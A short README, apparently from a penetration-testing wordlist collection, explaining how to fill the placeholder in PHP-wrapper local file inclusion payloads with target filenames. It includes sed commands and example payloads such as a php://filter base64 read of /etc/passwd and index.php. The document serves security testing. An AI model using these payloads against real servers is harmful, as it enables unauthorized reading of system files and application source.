# LFI PHP wrapper 
- The payload list given in `LFI-PHP-wrapper.txt` should be modified by replacing the placedholder (`*`) with a common filename, such as `index.php` or `/etc/passwd`.
- For more comprehensive testing, the placeholder can be combined with the payload in dedicated LFI/path-traversal payload list (`LF.md`, etc.). This would effectively combine the capabilities of both wordlists.

```shell
sed 's/*/index.php/g' [lfi-php-wrapper-txt-filename] > lfi-php-wrappers-custom.txt
sed 's/*/\/etc\/passwd/g' [lfi-php-wrapper-txt-filename] > lfi-php-wrappers-custom.txt
```

Eg.

1. `php://filter/convert.base64-encode/resource=*` -> `php://filter/convert.base64-encode/resource=index.php`
2. `php://filter/convert.base64-encode/resource=*` -> `php://filter/convert.base64-encode/resource=/etc/passwd`
